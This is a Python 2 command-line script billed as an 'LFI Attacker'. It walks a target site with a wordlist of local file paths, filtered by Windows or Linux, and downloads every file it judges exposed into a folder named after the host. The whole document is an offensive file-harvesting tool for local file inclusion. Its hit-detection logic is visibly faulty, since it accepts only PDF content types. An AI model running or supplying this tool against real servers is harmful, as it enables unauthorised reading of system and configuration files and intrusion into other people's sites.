#!/usr/bin/python
# -*- code: utf-8 -*-

import requests
import argparse
import os
import pathlib2
from urlparse import urlparse

print ("""\033[1;36m
      		   __    _____ _ ___   __  __                __
	 (@_      / /   / ____(_)   | / /_/ /_ _____ _______/ /____  ______
	  ) \____/ /___/ /___/ / /\ |/  _/  _// __ `/ ___/ / /  _  \/ ____/__________
(_)@8@8{}<   ___/ /___/ __/_/ / /_| |/ / / / / / / / /  /   /  \_/ / /_______________>
	  )_/  / /___/ /   / / __   / /_/ /_/ /_/ / /__/   /  ____/ /
	 (@   /_____/_/   /_/_/  |__\__/\__/\__,_/\___/_/|_|\____/_/
""")
print "		====> [ LFI Attacker ]		[ Author: FachrulRH ] <===="
print "		====> [ Good Luck :) ]		[ ig: @fachrull.rh  ] <====\n"			 
parser = argparse.ArgumentParser()

# Here the arguments
parser.add_argument("-u", help="Target URL i.e http://www.example.com/", dest='target')
parser.add_argument("--path", help="Add your Custom Directory", dest='path')
parser.add_argument("--type", help="Server OS Type i.e Linux or Windows", dest='type')

args = parser.parse_args() # Argument will ber parsed

target = args.target # Get target from arguments

try:
	target = target.replace('https://', '')
except:
	print('\033[0;31m[-] -u argument not supplied. see lfi-attack -h for help')
	quit()

target = target.replace('http://', '')
target = 'http://' + target

if args.path != None:
	target = target + args.path

# Scan the link and put the founds link to list founds
founds = []
def scan(links):
	try:
		for link in links:
			link = target + link
			req = requests.get(link)
			content = req.headers.get('Content-Type')
			if content == 'application/pdf':	
				if 'a' in req.text:
					print('\033[0;32m[+] Path found !: %s'% link)
					founds.append(link) 
				else:
					print('\033[0;31m[-] %s'% link)
			else:
				print("\033[0;31mContent type is text/html this tools doesn't support")
				print("\033[0;36mquit.....")
				quit()
	except KeyboardInterrupt:
		print("\nCTRL+C detected !")
		print("\033[0;36mSystem quit.....")
		quit()

# Get path list from lfi-path.txt
paths = []
def get_paths(type):
	try:
		with open('lfi-paths.txt','r') as wordlist:
			for directory in wordlist:
				directory = str(directory.replace("\n",""))
				try:
					if 'windows' in type:
						if 'var' in directory or 'usr' in directory or 'srv' in directory or 'Library' in directory or 'apache' in directory or 'proc' in directory or 'sbin' in directory:
							pass
						else:
							paths.append(directory)
					if 'linux' in type:
						if 'C:' in directory:
							pass
						else:
							paths.append(directory)
				except:
					paths.append(directory)
	except IOError:
		print('\033[0;31m[-] Wordlist not found!')
		quit()

# Get domain name for folder name
parse = urlparse(target)
nhost = parse.netloc

# Get file names in found urls
fnames = []
def get_name(founds):
	for gname in founds:
		gname = gname.split("/")[-1]
		fnames.append(gname)

def directory():
	if os.path.exists(nhost):
		os.chdir(nhost)
	else:
		os.mkdir(nhost)
		os.chdir(nhost)	

# Get the files in found urls
def get_files(files, names):
	for file, name in zip(files, names):
		req = requests.get(file)
		content = req.content
		stat = req.status_code
		if stat == 200:
			print("\033[0;32m[+] Succes to get: %s" % file)
			print("\033[0;36mSaving the file.....")
			name = open("%s.txt" % name, 'w')
			name.write(content)
			name.close()
			print("\033[0;32m[+] Success!\n")
		elif stat == 302:
			print("\033[0;31m[-] Failed to get : %s" % file)
		elif stat == 404:
			print("\033[0;31m[-] Failed to get : %s" % file)
		else:
			print("\033[0;31m[-] Failed to get : %s" % file)								

# Start getting files and save the files
def end():
	total = len(founds)
	print("\n\033[0;32mPath founds : %i"% total)

type = args.type
get_paths(type)
links = paths
scan(links)
end()
directory()
get_name(founds)
files = founds
names = fnames
get_files(files, names)
where = os.getcwd()
print("\033[0;36m[+] Succes file save in %s"% where)
